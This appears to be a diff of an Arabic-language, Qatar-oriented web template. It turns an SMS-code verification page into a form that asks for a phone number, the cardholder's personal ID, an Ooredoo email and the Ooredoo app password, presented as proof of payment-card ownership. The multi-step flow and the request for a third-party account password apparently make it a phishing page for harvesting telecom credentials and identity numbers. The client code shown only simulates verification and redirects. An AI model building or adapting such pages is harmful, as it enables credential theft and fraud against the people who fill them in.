@@ -5,236 +5,373 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><%= title %></title>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css">
-    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <style>
         body {
-            font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Arial', sans-serif;
             background-color: #f5f5f5;
             direction: rtl;
+            text-align: right;
         }
         
-        .header {
-            background-color: #8b1538;
-            color: white;
-            padding: 20px 0;
-            margin-bottom: 30px;
-        }
-        
-        .header h1 {
-            margin: 0;
-            font-size: 28px;
-        }
-        
-        .gray-container {
+        .well {
             background-color: #f5f5f5;
+            border: 1px solid #e3e3e3;
+            border-radius: 4px;
             padding: 30px;
-            border-radius: 8px;
-            margin: 20px auto;
-            max-width: 600px;
+            margin-bottom: 20px;
         }
         
-        .gray-container h2 {
-            color: #8b1538;
+        .page-header {
+            border-bottom: 2px solid #8b1538;
             margin-top: 0;
             margin-bottom: 25px;
-            font-size: 24px;
-            text-align: center;
+            padding-bottom: 10px;
         }
         
-        .verification-box {
-            background-color: white;
-            padding: 30px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            border: 1px solid #ddd;
-            text-align: center;
-        }
-        
-        .phone-display {
-            font-size: 24px;
-            color: #333;
-            font-weight: bold;
-            margin: 20px 0;
-            direction: ltr;
-        }
-        
-        .code-inputs {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin: 30px 0;
-            direction: ltr;
-        }
-        
-        .code-input {
-            width: 50px;
-            height: 50px;
-            text-align: center;
+        .page-header h1 {
+            color: #000;
             font-size: 24px;
             font-weight: bold;
-            border: 2px solid #ddd;
-            border-radius: 5px;
+            margin: 0;
         }
         
-        .code-input:focus {
-            border-color: #8b1538;
-            outline: none;
-        }
-        
-        .resend-code {
-            color: #8b1538;
-            cursor: pointer;
-            text-decoration: underline;
-            margin-top: 15px;
-            display: inline-block;
-        }
-        
-        .resend-code:hover {
-            color: #6d1028;
-        }
-        
-        .btn-primary {
-            background-color: #8b1538;
-            border-color: #8b1538;
-            padding: 12px 40px;
-            font-size: 16px;
-        }
-        
-        .btn-primary:hover {
-            background-color: #6d1028;
-            border-color: #6d1028;
-        }
-        
-        .btn-default {
-            padding: 12px 40px;
-            font-size: 16px;
-        }
-        
-        .form-actions {
-            margin-top: 30px;
+        .info-box {
+            background-color: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 25px;
             text-align: center;
         }
         
-        .form-actions .btn {
-            margin: 0 10px;
+        .info-box h3 {
+            color: #2d3748;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 0 0 15px 0;
         }
         
-        .timer {
-            color: #666;
+        .info-box p {
+            color: #4a5568;
             font-size: 14px;
+            line-height: 1.8;
+            margin: 0;
+        }
+        
+        .form-container {
+            background-color: #fff;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #2d3748;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .form-group label .required {
+            color: #e53e3e;
+            margin-right: 3px;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            font-size: 15px;
+            border: 2px solid #e2e8f0;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+            background-color: #f8fafc;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #8b1538;
+            background-color: #fff;
+            box-shadow: 0 0 0 3px rgba(139, 21, 56, 0.1);
+        }
+        
+        .form-control::placeholder {
+            color: #cbd5e0;
+        }
+        
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23718096' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: left 15px center;
+            padding-left: 40px;
+        }
+        
+        .ooredoo-fields {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .ooredoo-fields.show {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .btn-submit {
+            width: 100%;
+            background-color: #1976d2;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 20px;
+        }
+        
+        .btn-submit:hover:not(:disabled) {
+            background-color: #1565c0;
+        }
+        
+        .btn-submit:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            background: #cbd5e0;
+        }
+        
+        .btn-back {
+            width: 100%;
+            background-color: #fff;
+            color: #4a5568;
+            border: 2px solid #e2e8f0;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s ease;
             margin-top: 10px;
+        }
+        
+        .btn-back:hover {
+            background-color: #f7fafc;
+            border-color: #cbd5e0;
         }
     </style>
 </head>
 <body>
     <%- include('partials/header') %>
-    <%- include('partials/progress') %>
     
-    <div class="container">
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2">
-                <div class="gray-container">
-                    <h2>توثيق رقم الهاتف</h2>
+    <main>
+        <div class="container">
+            <div class="row" id="main-content">
+                <div class="col-sm-1"></div>
+                <div class="col-sm-10">
                     
-                    <div class="verification-box">
-                        <p style="font-size: 16px; color: #666; margin-bottom: 20px;">
-                            تم إرسال رمز التحقق إلى رقم الهاتف:
-                        </p>
-                        <div class="phone-display">+974 **** **45</div>
+                    <div class="help-block"></div>
+                    <%- include('partials/progress') %>
+                    
+                    <div class="well">
+                        <div class="page-header">
+                            <h1>توثيق رقم الهاتف</h1>
+                        </div>
                         
-                        <p style="font-size: 14px; color: #666; margin-top: 30px; margin-bottom: 10px;">
-                            أدخل رمز التحقق المكون من 6 أرقام:
-                        </p>
+                        <!-- Info Box -->
+                        <div class="info-box">
+                            <h3>توثيق رقم الهاتف</h3>
+                            <p>
+                                يرجى إدخال رقم الهاتف المرتبط بطريقة الدفع. لإثبات ملكية البطاقة.
+                                <br>
+                                لا يُشترط الدفع بطاقة تابعة للمستخدم المراد تسجيله، لكن يجب إثبات ملكية البطاقة 
+                                بإدخال بطاقة تحقق شخصي آخر. لكن يجب أن تكون منتمياً من خلال رقم الهاتف والرقم الشخصي لصاحب البطاقة.
+                            </p>
+                        </div>
                         
-                        <form id="verificationForm" action="/step6" method="POST">
-                            <div class="code-inputs">
-                                <input type="text" class="code-input" maxlength="1" name="code1" required>
-                                <input type="text" class="code-input" maxlength="1" name="code2" required>
-                                <input type="text" class="code-input" maxlength="1" name="code3" required>
-                                <input type="text" class="code-input" maxlength="1" name="code4" required>
-                                <input type="text" class="code-input" maxlength="1" name="code5" required>
-                                <input type="text" class="code-input" maxlength="1" name="code6" required>
-                            </div>
-                            
-                            <div class="timer" id="timer">
-                                إعادة إرسال الرمز بعد: <span id="countdown">60</span> ثانية
-                            </div>
-                            
-                            <a href="#" class="resend-code" id="resendBtn" style="display:none;">إعادة إرسال الرمز</a>
-                            
-                            <div class="form-actions">
-                                <a href="javascript:history.back()" class="btn btn-default">رجوع</a>
-                                <button type="submit" class="btn btn-primary" id="verifyBtn" disabled>تحقق</button>
-                            </div>
-                        </form>
+                        <!-- Form -->
+                        <div class="form-container">
+                            <form id="ooredooForm">
+                                
+                                <!-- Service Provider -->
+                                <div class="form-group">
+                                    <label for="provider">
+                                        <span class="required">*</span>
+                                        مزود الخدمة
+                                    </label>
+                                    <select id="provider" class="form-control" required>
+                                        <option value="">اختر مزود الخدمة</option>
+                                        <option value="ooredoo">Ooredoo</option>
+                                        <option value="vodafone">Vodafone Qatar</option>
+                                        <option value="other">أخرى</option>
+                                    </select>
+                                </div>
+                                
+                                <!-- Ooredoo Fields (Hidden by default) -->
+                                <div id="ooredooFields" class="ooredoo-fields">
+                                    
+                                    <!-- Phone Number -->
+                                    <div class="form-group">
+                                        <label for="phone">
+                                            <span class="required">*</span>
+                                            رقم الهاتف
+                                        </label>
+                                        <input 
+                                            type="tel" 
+                                            id="phone" 
+                                            class="form-control" 
+                                            placeholder="Phone"
+                                            inputmode="numeric"
+                                            pattern="[0-9]*">
+                                    </div>
+                                    
+                                    <!-- Personal ID -->
+                                    <div class="form-group">
+                                        <label for="personalId">
+                                            <span class="required">*</span>
+                                            الرقم الشخصي لمالك البطاقة
+                                        </label>
+                                        <input 
+                                            type="text" 
+                                            id="personalId" 
+                                            class="form-control" 
+                                            placeholder="Id">
+                                    </div>
+                                    
+                                    <!-- Email -->
+                                    <div class="form-group">
+                                        <label for="email">
+                                            <span class="required">*</span>
+                                            البريد الإلكتروني المعتمد بـ ooredoo
+                                        </label>
+                                        <input 
+                                            type="email" 
+                                            id="email" 
+                                            class="form-control" 
+                                            placeholder="Email"
+                                            dir="ltr"
+                                            style="text-align: left;">
+                                    </div>
+                                    
+                                    <!-- Password -->
+                                    <div class="form-group">
+                                        <label for="password">
+                                            <span class="required">*</span>
+                                            كلمة المرور المبرر لتطبيق ooredoo
+                                        </label>
+                                        <input 
+                                            type="password" 
+                                            id="password" 
+                                            class="form-control" 
+                                            placeholder="******">
+                                    </div>
+                                    
+                                </div>
+                                
+                                <!-- Submit Button -->
+                                <button type="submit" class="btn-submit" id="submitBtn">
+                                    استمرار
+                                </button>
+                                
+                                <!-- Back Button -->
+                                <button type="button" class="btn-back" onclick="window.location.href='/step3'">
+                                    رجوع
+                                </button>
+                                
+                            </form>
+                        </div>
+                        
                     </div>
+                    
                 </div>
+                <div class="col-sm-1"></div>
             </div>
         </div>
-    </div>
+    </main>
     
     <%- include('partials/footer') %>
     
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
     <script>
-        // التنقل التلقائي بين الحقول
-        const inputs = document.querySelectorAll('.code-input');
-        const verifyBtn = document.getElementById('verifyBtn');
-        
-        inputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                if (e.target.value.length === 1 && index < inputs.length - 1) {
-                    inputs[index + 1].focus();
+        $(document).ready(function() {
+            
+            // Show/Hide Ooredoo fields based on provider selection
+            $('#provider').on('change', function() {
+                const provider = $(this).val();
+                const ooredooFields = $('#ooredooFields');
+                
+                if (provider === 'ooredoo') {
+                    ooredooFields.addClass('show');
+                    // Make fields required
+                    ooredooFields.find('input').prop('required', true);
+                } else {
+                    ooredooFields.removeClass('show');
+                    // Remove required attribute
+                    ooredooFields.find('input').prop('required', false);
+                    // Clear fields
+                    ooredooFields.find('input').val('');
                 }
-                checkAllFilled();
+                
+                validateForm();
             });
             
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-                    inputs[index - 1].focus();
-                }
+            // Validate form on input
+            $('#ooredooForm input, #ooredooForm select').on('input change', function() {
+                validateForm();
             });
-        });
-        
-        function checkAllFilled() {
-            const allFilled = Array.from(inputs).every(input => input.value.length === 1);
-            verifyBtn.disabled = !allFilled;
-        }
-        
-        // العد التنازلي
-        let countdown = 60;
-        const countdownEl = document.getElementById('countdown');
-        const timerEl = document.getElementById('timer');
-        const resendBtn = document.getElementById('resendBtn');
-        
-        const timer = setInterval(() => {
-            countdown--;
-            countdownEl.textContent = countdown;
             
-            if (countdown === 0) {
-                clearInterval(timer);
-                timerEl.style.display = 'none';
-                resendBtn.style.display = 'inline-block';
+            function validateForm() {
+                const provider = $('#provider').val();
+                let isValid = provider !== '';
+                
+                if (provider === 'ooredoo') {
+                    const phone = $('#phone').val().trim();
+                    const personalId = $('#personalId').val().trim();
+                    const email = $('#email').val().trim();
+                    const password = $('#password').val().trim();
+                    
+                    isValid = phone !== '' && personalId !== '' && email !== '' && password !== '';
+                }
+                
+                $('#submitBtn').prop('disabled', !isValid);
             }
-        }, 1000);
-        
-        resendBtn.addEventListener('click', (e) => {
-            e.preventDefault();
-            // هنا يمكن إضافة منطق إعادة إرسال الرمز
-            alert('تم إعادة إرسال رمز التحقق');
-            countdown = 60;
-            timerEl.style.display = 'block';
-            resendBtn.style.display = 'none';
-            countdownEl.textContent = countdown;
-            setInterval(() => {
-                countdown--;
-                countdownEl.textContent = countdown;
-                if (countdown === 0) {
-                    clearInterval(timer);
-                    timerEl.style.display = 'none';
-                    resendBtn.style.display = 'inline-block';
+            
+            // Form submission
+            $('#ooredooForm').on('submit', function(e) {
+                e.preventDefault();
+                
+                const provider = $('#provider').val();
+                
+                if (provider === 'ooredoo') {
+                    // Process Ooredoo verification
+                    processOoredooVerification();
+                } else {
+                    // For other providers, just move to next step
+                    window.location.href = '/step5';
                 }
-            }, 1000);
+            });
+            
+            function processOoredooVerification() {
+                // Show loading state
+                $('#submitBtn').prop('disabled', true).text('جاري التحقق...');
+                
+                // Simulate verification process
+                setTimeout(function() {
+                    // Move to next step
+                    window.location.href = '/step5';
+                }, 1500);
+            }
+            
         });
     </script>
 </body>
